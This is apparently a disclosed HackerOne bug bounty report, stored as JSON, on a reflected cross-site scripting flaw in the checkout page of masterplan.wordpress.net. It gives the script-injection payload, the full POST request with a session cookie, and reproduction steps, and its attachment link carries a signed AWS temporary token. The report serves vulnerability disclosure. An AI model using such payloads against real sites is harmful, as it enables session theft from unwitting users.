@@ -1,0 +1,132 @@
+{
+  "id": 384112,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQxMTI=",
+  "url": "https://hackerone.com/reports/384112",
+  "title": "xss - reflected",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-19T10:54:17.989Z",
+  "submitted_at": "2018-07-19T10:54:17.989Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "arunthelegion",
+    "url": "/arunthelegion",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-07-24T13:17:31.047Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-07-23T14:35:56.266Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "vulnerable url:  http://masterplan.wordpress.net/store/checkout/\n\npayload:  1 Main Streetzbn0b\\\"><script>alert(document.cookie)</script>k8ez0\n\nvulnerable parameter: billing-address\n\nRequest:\n\nPOST /store/checkout/ HTTP/1.1\nHost: masterplan.wordpress.net\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nReferer: http://masterplan.wordpress.net/store/checkout/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 814\nCookie: PHPSESSID=a040c364fca0ec1d75201d8aaee61546; wordpress_test_cookie=WP+Cookie+check\n\nbilling%5baddress%5d=1%20Main%20Streetzbn0b%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ek8ez0&shipping%5bzip%5d=36310&billing%5bcountry%5d=AR&shipping%5baddress2%5d=1+Main+Street&payment%5bcardNumber%5d=555-555-0199@example.com&shipping%5bfirstName%5d=Peter&billing%5blastName%5d=Winter&shipping%5bcountry%5d=AR&payment%5bcardExpirationYear%5d=2018&billing%5bcity%5d=Winterville&billing%5bzip%5d=36310&shipping%5bcity%5d=Winterville&billing%5baddress2%5d=1+Main+Street&shipping%5blastName%5d=Winter&payment%5bsecurityId%5d=555-555-0199@example.com&shipping%5baddress%5d=1+Main+Street&payment%5bcardExpirationMonth%5d=01&payment%5bphone%5d=555-555-0199&payment%5bcardType%5d=Mastercard&billing%5bfirstName%5d=Peter&phpurchase-action=paypalprocheckout&sameAsBilling=on&payment%5bemail%5d=winter@example.com\n\n\nSteps to reproduce:\n\n1. get the request in burp repeater\n2. see the response in browser\n3. it will prompt you the session id.\n\n## Impact\n\nhttps://www.owasp.org/index.php/Cross-site_Scripting_(XSS)",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 322195,
+      "file_name": "xss_wp_high.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/322/195/3e89e3f4fd7a8f6ff0fb71267423de1f802190db/xss_wp_high.PNG?response-content-disposition=attachment%3B%20filename%3D%22xss_wp_high.PNG%22%3B%20filename%2A%3DUTF-8%27%27xss_wp_high.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DREO5IG%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T022807Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnneVoiheeVrYn06TOHU%2Fq2zgqOC8Sv%2BOKH%2FGAnshAIQIgAPAHqJZ7DjWF3X9HWktBOirApuw%2F19BKR3KmNLS6VgQquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBv%2BAORdmAf2qKtPgiqPBfdxFGQ4gh1bXu4t%2FwfazyZQBKebhdXFQjgNUe34tkbZp7l9aQIkk3VWFtfMyOlRK2oNwIrTg9J4Z%2BCt2N%2FvW0teeJli8qV0vL6ESaeQMlEGRk1WRO0VGr4Qm%2FLIaunnloSdG0lfCIhk1k0TaZAgkrXk9lZIExdoyaTVXMccsNbbWrtbxm8nygt7Gymot6aPm7Y4LoseFs5bzUHNGKkrQLW4PUETKdmhesy3fpKLnEbU4U%2BgvSpSDobTHI7i8q1O2Agsz%2FQ6CzzYW6L9L1JbCdpCABsdDQd5APZOGHGpYriaixGnInxfumF9pCNaq9CxkaK4dAN%2FsJCokmAOWSB8h0%2BDYSOT7UCnNrKNxSKlG0w6R28IL5gidAHNZp2PmCFAVmzz1uzVOX6ilobwTRoe4NgOYyCsIzvjJE6TIy724dBjGtCaxvrKSAFpcy4GYYglas2WUiGxouwm1p8qW6PUsylmixJ8fLdP9TYwGxbk529SnVz90zxdh694yXCbYZhzG8tl%2B3qD5e0%2B2UYl6vm43xclP7rNmGqm%2BTH0V0RjNpGK5Qb7eVpfncFdPI83k64pSZWRNB9JLvv9sUaGw2Hv9ppOCssA%2BpCaKzRhUBDm%2FSkAzi2K%2FHL9MEq7jYRSxbcD5IhaG0ICp3BV19tEyRYYNHGzyswUoKyl51kpKJSMrVOST4BiewjCEotNnSjWEdg7Jv3sBXGJNri2ypIv5%2BNx9SMbAYK6yewK4Iupt9AI%2B0qPD%2F6SyipUvMfjzZBP9haDbfjuJS5inj%2BDmRhXklnVfK4bqUdGo7LNs0k5cY9FrKlqh0H%2Fzt40AITSqW8SzQBHiVrWjEl38BWJe0ajrdqANQsvlH%2FiUIZ3KqzN0T7c9AowmOrjzAY6sQFduaBRItRS0p2ShadMPmvPjxVngd9AVFQNmslDCMNOSMGb%2F%2FR8SbjqnRtL7mkf7pTvwBcswAZUK2xu5IrpfCfZ98fxSJsaMWF8KqiFpmqDbuosWTTB38Rs0Hb4a2pKa1DMZUirIO5mzo6oTNIZvKbSdHMm2d0a0WPQhgZJlkfEB3AOZhnIzzJo%2FT3gKOZNgIc2I%2Bd6muGNebdM6Ly%2BhUnTqk9p9aKzPS6CclS6Ada8bxc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6248e01b2f5675de0a0db2233fbbb9a1554a1bed0ef6cfaf9592d8185e2831f6",
+      "file_size": 624684,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-08-22T14:35:56.461Z",
+  "allow_singular_disclosure_after": -236692331.2404694,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "barbod",
+    "ali",
+    "apapedulimu",
+    "eveeez",
+    "m7mdharoun",
+    "exception",
+    "japz",
+    "cryptographer",
+    "abuzarabu",
+    "kolinco5444"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 2763,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.wordpress.net",
+    "max_severity": "low"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
